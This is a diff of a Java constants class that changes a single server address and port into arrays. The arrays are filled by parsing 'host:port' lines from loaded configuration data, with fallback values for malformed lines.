@@ -20,8 +20,8 @@ public final class Constants {
 	public static final String VERSION = "1.26.1";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	public static final IOperatingSystemService OS_SERVICE = IOperatingSystemService.getInstance();
-	public static final String ADDRESS;
-	public static final int PORT;
+	public static final String[] ADDRESSES;
+	public static final int[] PORTS;
 	public static final File JAR_FILE;
 	
 	static {
@@ -32,24 +32,23 @@ public final class Constants {
 		final String text = new String(data);
 		final String[] lines = text.split("\r\n");
 		
-		String address;
-		int port;
+		ADDRESSES = new String[lines.length];
+		PORTS = new int[lines.length];
 		
-		try {
-			address = lines[0];
-		} catch (final Exception ex) {
-			address = "localhost";
+		for (int i = 0; i < lines.length; i++) {
+			try {
+				final String line = lines[i];
+				final String[] connectionData = line.split(":");
+				final String address = connectionData[0];
+				final int port = Integer.parseInt(connectionData[1]);
+				
+				ADDRESSES[i] = address;
+				PORTS[i] = port;
+			} catch (final Exception ex) {
+				ADDRESSES[i] = "";
+				PORTS[i] = 0;
+			}
 		}
-		
-		try {
-			final String portString = lines[1];
-			port = Integer.parseInt(portString);
-		} catch (final Exception ex) {
-			port = 23456;
-		}
-		
-		ADDRESS = address;
-		PORT = port;
 	}
 	
 	static {
